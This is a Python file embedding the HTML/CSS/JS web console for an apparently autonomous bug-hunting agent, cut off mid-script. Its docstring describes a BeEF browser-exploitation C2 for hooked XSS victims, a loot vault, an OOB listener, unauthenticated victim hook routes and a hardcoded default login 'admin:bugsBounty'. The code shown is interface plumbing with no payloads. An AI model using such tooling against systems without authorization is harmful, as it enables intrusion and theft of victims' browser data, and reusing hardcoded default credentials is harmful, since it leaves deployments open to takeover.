"""Live `#basement-ops` Web Command Center (`web/warroom_ui.py`) for the single `AGENT`.

Features:
  - RFC 7617 HTTP Basic Authentication enabled by default (`admin:bugsBounty`), constant-time verified via `secrets.compare_digest`.
  - Victim hook routes (`/beef/*` and `/oob/*`) intentionally unauthenticated so hooked XSS victim browsers connect seamlessly without admin credentials, using strictly relative/same-origin paths (works locally AND over Arena HTTPS preview tunnels!).
  - 4 Full Real-Time Workspaces:
      1. `#basement-ops` Agent Console + Live Side Feed
      2. Live Agent Stats & Stage Tracker, `.bin/` Process Matrix & `PAYLOAD_MUTEX` WAF Board
      3. Interactive BeEF Browser Exploitation C2 (10 Attack Modules, Custom JS Console, Live Hooked Victim Sandbox, Loot Vault & OOB Listener)
      4. Verified Advisories, `curl`/Python PoCs, Disproved Claims, Kill Chains & 22 `.bin/` Arsenal Table
"""
import base64
import errno
import gzip
import json
import os
import re
import secrets
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from core.config import CFG, configure_api_key
from core.llm import get_llm
from tools.beef import DEMO_VICTIM_HTML, get_beef_server
from tools.oob import get_oob_manager
from tools.registry import ToolRegistry
from agents.agent import AGENT_BUS
from agents.warroom import WarRoomSession

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<meta name="theme-color" content="#0d0d0f" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
<meta name="mobile-web-app-capable" content="yes" />
<title>bugsBounty — #basement-ops</title>
<style>
  :root {
    --bg: #0d0d0f;
    --sidebar: #09090b;
    --main: #141417;
    --panel: #17171b;
    --panel2: #1e1e24;
    --border: #2a2a32;
    --fg: #ececf1;
    --muted: #8e8ea0;
    --cyan: #28d7ff;
    --green: #2be89a;
    --red: #ff5d73;
    --yellow: #ffd166;
    --magenta: #c77dff;
    --user: #1d4ed8;
  }
  * { box-sizing: border-box; }
  html, body { height: 100%; overscroll-behavior: none; }
  body {
    margin: 0; background: var(--bg); color: var(--fg);
    font-family: ui-sans-serif, -apple-system, "Segoe UI", Inter, Roboto, Helvetica, Arial, sans-serif;
    font-size: 14px; overflow: hidden;
    display: grid; grid-template-columns: 276px 1fr; height: 100vh; height: 100dvh;
    -webkit-tap-highlight-color: transparent; -webkit-text-size-adjust: 100%;
  }
  button, .action, .hero-card, .stage-row, .ghost { touch-action: manipulation; }
  body.sb-hidden { grid-template-columns: 0 1fr; }
  body.sb-hidden .sidebar { transform: translateX(-100%); }
  button { font-family: inherit; cursor: pointer; }
  input, textarea, select {
    font-family: inherit; background: #101014; color: var(--fg);
    border: 1px solid var(--border); border-radius: 10px; padding: 9px 11px; font-size: 13px;
  }
  input:focus, textarea:focus, select:focus { outline: none; border-color: #4b4b57; }
  code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
  a { color: var(--cyan); }

  /* ---------- Sidebar ---------- */
  .sidebar {
    background: var(--sidebar); border-right: 1px solid var(--border);
    display: flex; flex-direction: column; min-height: 0; overflow: hidden;
    transition: transform .18s ease; width: 276px;
  }
  .sb-top { display: flex; align-items: center; justify-content: space-between; padding: 13px 12px 9px; }
  .brand { display: flex; align-items: center; gap: 9px; font-weight: 800; letter-spacing: .2px; }
  .brand .logo {
    width: 26px; height: 26px; border-radius: 8px; display: grid; place-items: center;
    background: linear-gradient(135deg, #0e7490, #155e75); color: #c8f7ff; font-size: 14px;
  }
  .brand small { display: block; font-weight: 500; color: var(--muted); font-size: 10.5px; letter-spacing: .2px; }
  .icon-btn {
    background: transparent; color: var(--muted); border: 1px solid transparent;
    border-radius: 8px; width: 30px; height: 30px; font-size: 15px; line-height: 1;
    display: grid; place-items: center;
  }
  .icon-btn:hover { background: var(--panel2); color: var(--fg); }
  .new-chat {
    margin: 4px 12px 8px; padding: 10px 12px; text-align: left; font-weight: 700; font-size: 13px;
    background: #101014; color: var(--fg); border: 1px solid var(--border); border-radius: 10px;
  }
  .new-chat:hover { background: var(--panel2); border-color: #3d3d47; }
  .sb-section { padding: 8px 12px 4px; border-top: 1px solid #17171d; }
  .sb-section.grow { flex: 1; min-height: 0; overflow-y: auto; }
  .sb-label {
    display: flex; justify-content: space-between; align-items: center;
    font-size: 10.5px; text-transform: uppercase; letter-spacing: .9px; color: var(--muted); margin-bottom: 7px;
  }
  .target-row { display: flex; gap: 6px; }
  .target-row input { flex: 1; min-width: 0; font-size: 12.5px; padding: 8px 9px; }
  .mini {
    border-radius: 8px; border: 1px solid var(--border); background: var(--panel2);
    color: var(--fg); padding: 0 11px; font-size: 12px; font-weight: 700;
  }
  .mini.primary { background: #10324a; border-color: var(--cyan); color: var(--cyan); }
  .target-hint { margin-top: 6px; font-size: 11px; color: var(--muted); word-break: break-all; }
  .target-hint.set { color: var(--green); }
  .action {
    width: 100%; display: flex; align-items: center; gap: 10px; text-align: left;
    background: transparent; border: 1px solid transparent; border-radius: 10px;
    padding: 8px 9px; color: var(--fg); margin-bottom: 3px;
  }
  .action:hover { background: var(--panel2); border-color: var(--border); }
  .action span { font-size: 16px; width: 20px; text-align: center; }
  .action b { display: block; font-size: 12.5px; }
  .action small { color: var(--muted); font-size: 10.5px; }
  .action.accent { background: #0f2b3a; border-color: #1d4d63; }
  .action.accent:hover { border-color: var(--cyan); }
  .stage-row {
    display: flex; align-items: center; gap: 8px; width: 100%; text-align: left;
    background: transparent; border: none; color: var(--muted); padding: 4px 6px;
    border-radius: 7px; font-size: 11.5px;
  }
  .stage-row:hover { background: var(--panel2); color: var(--fg); }
  .stage-row .dot { width: 16px; height: 16px; border-radius: 50%; border: 1px solid var(--border); display: grid; place-items: center; font-size: 9px; }
  .stage-row.done { color: var(--green); }
  .stage-row.done .dot { border-color: var(--green); background: #0d2b21; }
  .stage-row.running { color: var(--yellow); font-weight: 700; }
  .stage-row.running .dot { border-color: var(--yellow); background: #2b2310; animation: pulse 1s infinite alternate; }
  @keyframes pulse { from { opacity: .4; } to { opacity: 1; } }
  .stage-row small { margin-left: auto; font-size: 10px; color: var(--muted); }
  .mini-kpis { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; font-size: 10.5px; color: var(--muted); }
  .mini-kpis div { background: #101014; border: 1px solid var(--border); border-radius: 8px; padding: 6px 8px; }
  .mini-kpis b { display: block; font-size: 14px; color: var(--fg); }
  .sb-foot { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; padding: 9px 12px 12px; border-top: 1px solid #17171d; }
  .ghost {
    background: transparent; border: 1px solid var(--border); color: var(--muted);
    border-radius: 8px; padding: 6px 8px; font-size: 11px; font-weight: 600;
  }
  .ghost:hover { color: var(--fg); border-color: #3d3d47; }

  /* ---------- Main ---------- */
  .main { display: flex; flex-direction: column; min-width: 0; min-height: 0; background: var(--main); }
  .topbar {
    display: flex; align-items: center; gap: 10px; padding: 9px 14px;
    border-bottom: 1px solid var(--border); background: rgba(20,20,23,.92); backdrop-filter: blur(6px);
  }
  .menu-btn { display: none; }
  .topbar-title { font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
  .pill {
    font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: .6px;
    padding: 2px 8px; border-radius: 99px; background: #1c1c22; color: var(--muted); border: 1px solid var(--border);
  }
  .pill.RUNNING { color: var(--yellow); border-color: #57470f; background: #2a2310; }
  .pill.DONE { color: var(--green); border-color: #14503a; background: #0d2b21; }
  .pill.ERROR { color: var(--red); border-color: #5b1b26; background: #2a1015; }
  .topbar-right { margin-left: auto; display: flex; gap: 6px; align-items: center; overflow-x: auto; }
  .chip {
    font-size: 10.5px; color: var(--muted); background: #101014; border: 1px solid var(--border);
    border-radius: 99px; padding: 3px 9px; white-space: nowrap;
  }
  .chip b { color: var(--fg); }
  .chip.green b { color: var(--green); }
  .chip.red b { color: var(--red); }

  .scroll { flex: 1; overflow-y: auto; scroll-behavior: smooth; overscroll-behavior: contain; -webkit-overflow-scrolling: touch; }
  .thread { max-width: 820px; margin: 0 auto; padding: 26px 20px 12px; display: flex; flex-direction: column; gap: 12px; }

  /* ---------- Welcome ---------- */
  .hero { text-align: center; padding: 42px 8px 20px; }
  .hero h1 { font-size: 26px; margin: 0 0 8px; letter-spacing: -.4px; }
  .hero p { color: var(--muted); max-width: 560px; margin: 0 auto 22px; line-height: 1.55; font-size: 13px; }
  .hero-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 9px; max-width: 620px; margin: 0 auto; }
  .hero-card {
    text-align: left; background: #17171b; border: 1px solid var(--border); border-radius: 12px;
    padding: 12px 13px; color: var(--fg);
  }
  .hero-card:hover { border-color: #45454f; background: #1c1c22; }
  .hero-card b { display: block; font-size: 12.5px; margin-bottom: 3px; }
  .hero-card code { color: var(--cyan); font-size: 11px; }
  .hero-card small { display: block; color: var(--muted); font-size: 10.8px; margin-top: 4px; line-height: 1.4; }

  /* ---------- Messages ---------- */
  .msg-row { display: flex; gap: 10px; align-items: flex-start; }
  .msg-row.user { flex-direction: row-reverse; }
  .avatar {
    width: 27px; height: 27px; border-radius: 8px; flex: none; display: grid; place-items: center;
    font-size: 9.5px; font-weight: 800; margin-top: 2px;
  }
  .avatar.agent { background: #0e2b36; color: var(--cyan); border: 1px solid #17475c; }
  .avatar.user { background: #16224a; color: #b9c8ff; border: 1px solid #26356b; }
  .bubble-col { min-width: 0; max-width: 88%; }
  .who { display: flex; gap: 7px; align-items: center; font-size: 10.5px; color: var(--muted); margin-bottom: 3px; }
  .bubble {
    background: #1b1b20; border: 1px solid #26262e; border-radius: 13px;
    padding: 10px 13px; line-height: 1.6; font-size: 13.4px; word-break: break-word; white-space: normal;
  }
  .msg-row.user .bubble { background: var(--user); border-color: #2f5bd6; color: #fff; }
  .bubble.verified { border-color: #14503a; background: #0e241c; }
  .bubble.disproved { border-color: #5b1b26; background: #241015; }
  .bubble.warn { border-color: #57470f; background: #241f0e; }
  .bubble.error { border-color: #5b1b26; background: #241015; }
  .bubble.waf { border-color: #4a2c63; background: #1d1428; }
  .bubble code { background: #101014; border: 1px solid #2b2b34; border-radius: 5px; padding: 1px 5px; font-size: 11.8px; color: #9be7ff; }
  .msg-row.user .bubble code { background: rgba(0,0,0,.25); border-color: rgba(255,255,255,.18); color: #fff; }
  .bubble pre.code {
    background: #0b0b0e; border: 1px solid #26262e; border-radius: 8px; padding: 9px 11px;
    overflow-x: auto; font-size: 11.5px; color: #9be7ff; margin: 7px 0 2px; white-space: pre-wrap; word-break: break-all;
  }
  .kindtag {
    font-size: 9px; font-weight: 800; letter-spacing: .5px; text-transform: uppercase;
    padding: 1px 6px; border-radius: 5px; background: #26262e; color: var(--muted);
  }
  .kindtag.verified { background: #0d2b21; color: var(--green); }
  .kindtag.disproved, .kindtag.error { background: #2a1015; color: var(--red); }
  .kindtag.warn { background: #2a2310; color: var(--yellow); }
  .kindtag.waf { background: #1d1428; color: var(--magenta); }

  .activity {
    display: flex; gap: 8px; align-items: baseline; font-size: 11.5px; color: var(--muted);
    padding: 4px 10px 4px 42px; border-left: 2px solid #23232b; margin-left: 8px;
  }
  .activity .atag { font-size: 9px; text-transform: uppercase; letter-spacing: .6px; color: var(--cyan); font-weight: 800; }
  .activity.done { color: #9ea0b3; }

  .typing { display: flex; gap: 9px; align-items: center; padding: 4px 0 10px 37px; color: var(--muted); font-size: 11.5px; }
  .dots { display: inline-flex; gap: 3px; }
  .dots i { width: 5px; height: 5px; border-radius: 50%; background: var(--cyan); display: block; animation: bounce 1s infinite; }
  .dots i:nth-child(2) { animation-delay: .15s; }
  .dots i:nth-child(3) { animation-delay: .3s; }
  @keyframes bounce { 0%, 70%, 100% { transform: translateY(0); opacity: .45; } 35% { transform: translateY(-4px); opacity: 1; } }

  /* ---------- Composer ---------- */
  .composer { padding: 8px 18px 14px; background: var(--main); }
  .chips { display: flex; gap: 6px; overflow-x: auto; padding: 0 0 8px; max-width: 820px; margin: 0 auto; }
  .chips button {
    background: #17171b; border: 1px solid var(--border); color: var(--muted);
    border-radius: 99px; padding: 4px 11px; font-size: 11.5px; white-space: nowrap;
  }
  .chips button:hover { color: var(--cyan); border-color: #24596d; }
  .input-wrap {
    max-width: 820px; margin: 0 auto; display: flex; align-items: flex-end; gap: 8px;
    background: #1a1a1f; border: 1px solid var(--border); border-radius: 16px; padding: 8px 8px 8px 14px;
    transition: border-color .15s;
  }
  .input-wrap:focus-within { border-color: #4a5b6b; }
  #chatInput {
    flex: 1; border: none; background: transparent; resize: none; max-height: 190px;
    padding: 4px 0; font-size: 13.5px; line-height: 1.5;
  }
  #chatInput:focus { outline: none; }
  .send {
    width: 32px; height: 32px; border-radius: 10px; border: none; flex: none;
    background: var(--cyan); color: #06202b; font-size: 15px; font-weight: 800; display: grid; place-items: center;
  }
  .send:disabled { opacity: .35; }
  .composer-foot { max-width: 820px; margin: 7px auto 0; text-align: center; font-size: 10.5px; color: var(--muted); }

  /* ---------- Drawer panel ---------- */
  .backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.45); opacity: 0; pointer-events: none; transition: opacity .16s; z-index: 40; }
  .backdrop.show { opacity: 1; pointer-events: auto; }
  .panel {
    position: fixed; top: 0; right: 0; height: 100vh; width: min(520px, 100vw); z-index: 41;
    background: var(--panel); border-left: 1px solid var(--border);
    display: flex; flex-direction: column; transform: translateX(102%); transition: transform .18s ease;
  }
  .panel.show { transform: translateX(0); }
  .panel-head {
    display: flex; justify-content: space-between; align-items: center; gap: 8px;
    padding: 11px 14px; border-bottom: 1px solid var(--border); font-weight: 700; font-size: 13px;
  }
  .panel-body { flex: 1; overflow-y: auto; padding: 12px 14px 26px; }
  .panel h4 { font-size: 10.5px; text-transform: uppercase; letter-spacing: .8px; color: var(--muted); margin: 16px 0 7px; }
  .card { background: #101014; border: 1px solid var(--border); border-radius: 10px; padding: 10px 12px; margin-bottom: 8px; font-size: 12px; }
  .card.critical { border-left: 3px solid var(--red); }
  .card.high { border-left: 3px solid var(--yellow); }
  .card.ok { border-left: 3px solid var(--green); }
  .card.bad { border-left: 3px solid var(--red); }
  .card .row { display: flex; justify-content: space-between; gap: 8px; flex-wrap: wrap; }
  .evrow { display: flex; gap: 8px; padding: 4px 0; border-bottom: 1px solid #1a1a20; font-size: 11px; }
  .evrow .cat { color: var(--cyan); min-width: 62px; font-size: 9.5px; text-transform: uppercase; font-weight: 700; padding-top: 1px; }
  .evrow .txt { min-width: 0; flex: 1; word-break: break-word; }
  .evrow .txt small { color: var(--muted); display: block; }
  .panel-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px; }
  .panel-actions button, .panel .btn {
    background: var(--panel2); border: 1px solid var(--border); color: var(--fg);
    border-radius: 8px; padding: 6px 10px; font-size: 11.5px; font-weight: 700;
  }
  .panel .btn.primary { background: #10324a; border-color: var(--cyan); color: var(--cyan); }
  .panel .btn.danger { background: #3b1322; border-color: var(--red); color: #ff9ebb; }
  .panel .btn.success { background: #0f3628; border-color: var(--green); color: var(--green); }
  .panel input, .panel textarea, .panel select { width: 100%; margin-bottom: 7px; font-size: 12px; }
  .panel pre.code { background: #08080b; border: 1px solid #26262e; border-radius: 8px; padding: 8px 10px; font-size: 10.8px; color: #9be7ff; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
  #victimHolder { display: none; border-top: 1px solid var(--border); padding: 10px 14px 12px; background: #121216; }
  #victimHolder.show { display: block; }
  .victim-head { display: flex; justify-content: space-between; align-items: center; font-size: 10.5px; text-transform: uppercase; letter-spacing: .8px; color: var(--muted); margin-bottom: 7px; }
  #victimFrame { width: 100%; height: 300px; border: 1px solid var(--border); border-radius: 10px; background: #0b1220; }
  .empty { color: var(--muted); font-size: 11.5px; padding: 6px 0; }

  .jump {
    position: fixed; right: 18px; bottom: 118px; z-index: 20;
    width: 34px; height: 34px; border-radius: 50%; display: none; place-items: center;
    background: #1c1c22; border: 1px solid var(--border); color: var(--fg); font-size: 15px;
    box-shadow: 0 6px 18px rgba(0,0,0,.55);
  }
  .jump.show { display: grid; }
  .jump:active { background: #26262e; }

  /* ---------- Mobile bottom action bar ---------- */
  .mobile-nav { display: none; }

  /* ---------- Responsive / mobile view ---------- */
  @media (max-width: 900px) {
    body { grid-template-columns: 0 1fr; }
    .sidebar {
      position: fixed; z-index: 50; height: 100vh; height: 100dvh;
      width: min(330px, 88vw); transform: translateX(-100%);
      box-shadow: 0 0 44px rgba(0,0,0,.65);
      padding-bottom: env(safe-area-inset-bottom, 0px);
      padding-top: env(safe-area-inset-top, 0px);
      overscroll-behavior: contain; overflow-y: auto; -webkit-overflow-scrolling: touch;
    }
    /* whole sheet scrolls on short screens instead of squashing the stage list */
    .sidebar .sb-section.grow { flex: none; overflow: visible; min-height: 0; }
    .sb-foot { position: sticky; bottom: 0; background: var(--sidebar); }
    body.sb-open .sidebar { transform: translateX(0); }
    body.sb-open .backdrop { opacity: 1; pointer-events: auto; }
    .menu-btn { display: grid; }
    .main { min-width: 0; }

    /* header: keep it short, only the numbers that matter */
    .topbar { padding: 7px 10px; gap: 7px; }
    .topbar-title { font-size: 12.5px; gap: 6px; }
    .topbar-right { gap: 4px; }
    .topbar-right .chip:not(.green):not(.red) { display: none; }
    .chip { font-size: 10px; padding: 2px 8px; }
    .pill { font-size: 9px; padding: 2px 6px; letter-spacing: .3px; }
    .menu-btn, .icon-btn { width: 34px; height: 34px; }

    /* messages */
    .thread { padding: 14px 10px 6px; gap: 10px; }
    .msg-row { gap: 7px; }
    .avatar { width: 24px; height: 24px; border-radius: 7px; font-size: 8.5px; }
    .bubble-col { max-width: calc(100% - 34px); }
    .bubble { font-size: 14px; padding: 9px 12px; border-radius: 12px; }
    .bubble pre.code { font-size: 11px; }
    .who { font-size: 10px; }
    .activity { padding-left: 31px; margin-left: 4px; font-size: 11px; }
    .typing { padding-left: 31px; }

    /* hero */
    .hero { padding: 22px 2px 10px; }
    .hero h1 { font-size: 21px; }
    .hero p { font-size: 12.5px; margin-bottom: 16px; }
    .hero-grid { grid-template-columns: 1fr; gap: 7px; }

    /* composer + big touch targets */
    .composer { padding: 6px 10px 8px; }
    .jump { right: 12px; bottom: calc(148px + env(safe-area-inset-bottom, 0px)); width: 40px; height: 40px; font-size: 17px; }
    .chips { padding-bottom: 7px; gap: 5px; scrollbar-width: none; }
    .chips::-webkit-scrollbar { display: none; }
    .chips button { padding: 7px 12px; font-size: 12px; }
    .input-wrap { border-radius: 14px; padding: 7px 7px 7px 12px; }
    #chatInput { font-size: 16px; line-height: 1.45; }
    .send { width: 36px; height: 36px; }
    .composer-foot { display: none; }

    /* iOS zooms any focused control under 16px */
    input, textarea, select { font-size: 16px; }
    .panel input, .panel textarea, .panel select { font-size: 16px; }
    .target-row input { font-size: 16px; padding: 9px 10px; }
    .mini { min-height: 40px; }
    .panel .btn, .panel-actions button { padding: 9px 12px; }
    .sb-label { font-size: 11px; }
    .action { padding: 10px 9px; }
    .stage-row { padding: 9px 6px; font-size: 12.5px; }
    .ghost { padding: 10px 8px; font-size: 12px; }

    /* drawers become full-screen sheets */
    .panel {
      width: 100vw; height: 100vh; height: 100dvh; border-left: none;
      padding-top: env(safe-area-inset-top, 0px);
    }
    .panel-head { padding: 12px 14px; }
    .panel-body { padding-bottom: calc(26px + env(safe-area-inset-bottom, 0px)); overscroll-behavior: contain; }
    .backdrop { background: rgba(0,0,0,.6); }
    #victimHolder { padding: 8px 10px 10px; }
    #victimFrame { height: 42vh; height: 42dvh; }

    /* bottom action bar */
    .mobile-nav {
      display: grid; grid-template-columns: repeat(5, 1fr); gap: 2px; flex: none;
      border-top: 1px solid var(--border); background: #0a0a0d;
      padding: 5px 4px calc(5px + env(safe-area-inset-bottom, 0px));
    }
    .mobile-nav button {
      display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 2px;
      min-height: 46px; padding: 4px 0; border: none; border-radius: 10px; background: transparent;
      color: var(--muted); font-size: 9.5px; font-weight: 700; letter-spacing: .2px;
    }
    .mobile-nav button span { font-size: 17px; line-height: 1; }
    .mobile-nav button.active { color: var(--cyan); background: #10202a; }
    .mobile-nav button:active { background: #1d1d24; }
    body.panel-open .mobile-nav, body.sb-open .mobile-nav { display: none; }
  }

  @media (max-width: 420px) {
    .topbar-title { font-size: 11.5px; }
    .topbar-right .chip.red { display: none; }
    .bubble { font-size: 13.5px; }
    .mobile-nav button { font-size: 9px; }
  }

  /* phones in landscape: vertical space is the scarce resource */
  @media (max-width: 900px) and (max-height: 460px) {
    .mobile-nav { display: none; }
    .hero { padding: 10px 2px 6px; }
    .hero h1 { font-size: 18px; }
    .hero p { display: none; }
    .hero-grid { grid-template-columns: 1fr 1fr; }
    .topbar { padding: 5px 10px; }
    .jump { bottom: 84px; }
  }
</style>
</head>
<body>
<aside class="sidebar" id="sidebar">
  <div class="sb-top">
    <div class="brand">
      <span class="logo">◈</span>
      <div>bugsBounty<small>single agent console</small></div>
    </div>
  </div>
  <button class="new-chat" onclick="newChat()">＋ New chat</button>

  <div class="sb-section">
    <label class="sb-label">Target</label>
    <div class="target-row">
      <input id="targetInput" placeholder="site.com or https://..." autocomplete="off" />
      <button class="mini primary" onclick="setTarget()">Set</button>
    </div>
    <div class="target-hint" id="targetHint">No target set</div>
  </div>

  <div class="sb-section">
    <label class="sb-label">Actions</label>
    <button class="action" onclick="run('/recon')"><span>🔎</span><div><b>Recon</b><small>map everything about the target</small></div></button>
    <button class="action" onclick="run('/hunt')"><span>🎯</span><div><b>Hunt</b><small>find vulnerabilities</small></div></button>
    <button class="action accent" onclick="run('/auto')"><span>⚡</span><div><b>Auto</b><small>recon → hunt → pursue each bug</small></div></button>
  </div>

  <div class="sb-section grow">
    <label class="sb-label">Stages <span id="stageProgress">0/6</span></label>
    <div id="stageList"></div>
  </div>

  <div class="sb-section">
    <div class="mini-kpis" id="miniKpis"></div>
  </div>

  <div class="sb-foot">
    <button class="ghost" onclick="openPanel('ops')">Live ops</button>
    <button class="ghost" onclick="openPanel('findings')">Findings</button>
    <button class="ghost" onclick="openPanel('beef')">BeEF</button>
    <button class="ghost" onclick="openPanel('arsenal')">Arsenal</button>
    <button class="ghost" onclick="openPanel('keys')">API key</button>
    <button class="ghost" onclick="openPanel('about')">Help</button>
  </div>
</aside>

<main class="main">
  <header class="topbar">
    <button class="icon-btn menu-btn" onclick="toggleSidebar()">☰</button>
    <div class="topbar-title">#basement-ops <span class="pill" id="agentState">idle</span></div>
    <div class="topbar-right">
      <span class="chip">HTTP <b id="kHttp">0</b></span>
      <span class="chip">.bin <b id="kBin">0</b></span>
      <span class="chip">WAF <b id="kWaf">0</b></span>
      <span class="chip green">verified <b id="kVer">0</b></span>
      <span class="chip red">disproved <b id="kDis">0</b></span>
      <span class="chip" id="llmBadge">…</span>
    </div>
  </header>

  <div class="scroll" id="chatScroll">
    <div class="thread" id="chatThread"></div>
  </div>
  <button class="jump" id="jumpBtn" title="Jump to latest" onclick="scrollToBottom(true)">↓</button>

  <div class="composer">
    <div class="chips">
      <button onclick="run('/target')">/target &lt;site.com&gt;</button>
      <button onclick="run('/recon')">/recon</button>
      <button onclick="run('/hunt')">/hunt</button>
      <button onclick="run('/auto')">/auto</button>
      <button onclick="run('/verify')">/verify</button>
      <button onclick="run('/chains')">/chains</button>
      <button onclick="run('/report')">/report</button>
      <button onclick="run('/status')">/status</button>
      <button onclick="run('/lab')">/lab</button>
    </div>
    <div class="input-wrap">
      <textarea id="chatInput" rows="1" placeholder="Message the agent…   e.g. /target example.com  then  /auto"></textarea>
      <button class="send" id="sendBtn" onclick="send()">➤</button>
    </div>
    <div class="composer-foot">Enter to send · Shift+Enter for a new line · every bug is verified before it reaches the report</div>
  </div>

  <nav class="mobile-nav" id="mobileNav" aria-label="Console actions">
    <button id="mnav-chat" class="active" onclick="mobileTab('chat')"><span>💬</span>Chat</button>
    <button id="mnav-recon" onclick="mobileTab('recon')"><span>🔎</span>Recon</button>
    <button id="mnav-hunt" onclick="mobileTab('hunt')"><span>🎯</span>Hunt</button>
    <button id="mnav-auto" onclick="mobileTab('auto')"><span>⚡</span>Auto</button>
    <button id="mnav-menu" onclick="mobileTab('menu')"><span>☰</span>More</button>
  </nav>
</main>

<div class="backdrop" id="backdrop" onclick="closeSidebarOrPanel()"></div>
<div class="panel" id="panel">
  <div class="panel-head"><span id="panelTitle">Panel</span><button class="icon-btn" onclick="closePanel()">✕</button></div>
  <div class="panel-body" id="panelBody"></div>
  <div id="victimHolder">
    <div class="victim-head"><span>Victim browser sandbox</span><button class="icon-btn" onclick="spawnVictim()" title="Reload victim">⟳</button></div>
    <iframe id="victimFrame" src="about:blank"></iframe>
  </div>
</div>

<script>
const AGENT_COLOR = '#28d7ff';
const COLORS = { AGENT: AGENT_COLOR, SYSTEM: '#8e8ea0', YOU: '#ffffff' };
const KIND_LABEL = {
  operator: 'you', info: 'agent', stage: 'stage', verified: 'verified',
  disproved: 'disproved', warn: 'warning', error: 'error', waf: 'waf'
};

let state = null;
let eventsBuffer = [];
let lastEventSeq = 0;
let pollInFlight = false;
let pollTimer = null;
let toolsCache = [];
let panel = '';
let selectedSid = '*';
let lastThreadSig = '';
let lastPanelSig = '';

const $ = id => document.getElementById(id);

function esc(s) {
  return String(s ?? '').replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
}

function md(text) {
  const parts = String(text ?? '').split('```');
  return parts.map((part, i) => {
    if (i % 2 === 1) {
      const body = part.replace(/^[a-zA-Z0-9]*\n/, '').replace(/\s+$/, '');
      return `<pre class="code">${esc(body)}</pre>`;
    }
    let h = esc(part);
    h = h.replace(/`([^`\n]+)`/g, '<code>$1</code>');
    h = h.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
    h = h.replace(/(https?:\/\/[^\s<)]+)/g, '<a href="$1" target="_blank" rel="noopener">$1</a>');
    return h.replace(/\n/g, '<br>');
  }).join('');
}

async function api(url, opts = {}) {
  const res = await fetch(url, Object.assign({ credentials: 'same-origin' }, opts));
  if (!res.ok) throw new Error('HTTP ' + res.status);
  return res.json();
}

/* ---------------- layout ---------------- */
function toggleSidebar() {
  const open = document.body.classList.toggle('sb-open');
  if (open) {
    panel = ''; $('panel').classList.remove('show'); $('backdrop').classList.remove('show');
    document.body.classList.remove('panel-open'); $('victimHolder').classList.remove('show');
    markNav('menu');
  } else {
    markNav('chat');
  }
}
function closeSidebarOrPanel() { document.body.classList.remove('sb-open'); closePanel(); }

/* Mobile bottom bar: chat / recon / hunt / auto / more */
function markNav(tab) {
  const map = { chat: 'mnav-chat', recon: 'mnav-recon', hunt: 'mnav-hunt', auto: 'mnav-auto', menu: 'mnav-menu' };
  Object.values(map).forEach(id => { const el = $(id); if (el) el.classList.remove('active'); });
  const active = $(map[tab]);
  if (active) active.classList.add('active');
}
function mobileTab(tab) {
  if (tab === 'menu') { markNav('menu'); toggleSidebar(); return; }
  document.body.classList.remove('sb-open');
  closePanel();
  if (tab === 'chat') { markNav('chat'); $('chatInput').focus(); setTimeout(() => scrollToBottom(true), 200); return; }
  const cmds = { recon: '/recon', hunt: '/hunt', auto: '/auto' };
  markNav(tab);
  run(cmds[tab]);
  setTimeout(() => markNav('chat'), 1200);
}

function openPanel(name) {
  panel = name;
  const titles = { ops: 'Live operations', findings: 'Findings, chains & PoCs', beef: 'BeEF hook C2 & OOB', arsenal: 'Arsenal status', keys: 'LLM / API key', about: 'How to drive the agent' };
  $('panelTitle').textContent = titles[name] || name;
  $('panel').classList.add('show');
  $('backdrop').classList.add('show');
  lastPanelSig = '';
  document.body.classList.remove('sb-open');
  document.body.classList.add('panel-open');
  $('victimHolder').classList.toggle('show', name === 'beef');
  if (state) renderPanel();
  if (name === 'beef') spawnVictim();
}
function closePanel() {
  panel = '';
  $('panel').classList.remove('show');
  $('backdrop').classList.remove('show');
  $('victimHolder').classList.remove('show');
  document.body.classList.remove('panel-open');
}

/* ---------------- actions ---------------- */
async function sendMessage(message) {
  if (!message || !message.trim()) return;
  try {
    await api('api/chat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message, async: true })
    });
  } catch (e) {
    addLocalError('Could not reach the agent: ' + e.message);
  }
  await refreshState();
}

function run(cmd) {
  if (cmd === '/target') { $('targetInput').focus(); return; }
  sendMessage(cmd);
}

function send() {
  const inp = $('chatInput');
  const msg = inp.value.trim();
  if (!msg) return;
  inp.value = '';
  autoGrow();
  sendMessage(msg);
}

async function setTarget() {
  const v = $('targetInput').value.trim();
  if (!v) return;
  await sendMessage('/target ' + v);
}

async function newChat() {
  try { await api('api/reset', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }); } catch (e) {}
  lastThreadSig = '';
  lastPanelSig = '';
  await refreshState();
  closePanel();
  document.body.classList.remove('sb-open');
  markNav('chat');
}

function addLocalError(text) {
  const thread = $('chatThread');
  thread.insertAdjacentHTML('beforeend',
    `<div class="msg-row"><div class="avatar agent">!</div><div class="bubble-col"><div class="bubble error">${esc(text)}</div></div></div>`);
  scrollToBottom(true);
}

/* ---------------- composer behaviour ---------------- */
function autoGrow() {
  const t = $('chatInput');
  t.style.height = 'auto';
  t.style.height = Math.min(190, t.scrollHeight) + 'px';
}
$('chatInput').addEventListener('input', autoGrow);
$('chatInput').addEventListener('keydown', e => {
  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); }
});
$('targetInput').addEventListener('keydown', e => {
  if (e.key === 'Enter') { e.preventDefault(); setTarget(); }
});

/* Keep the composer visible when the mobile keyboard opens */
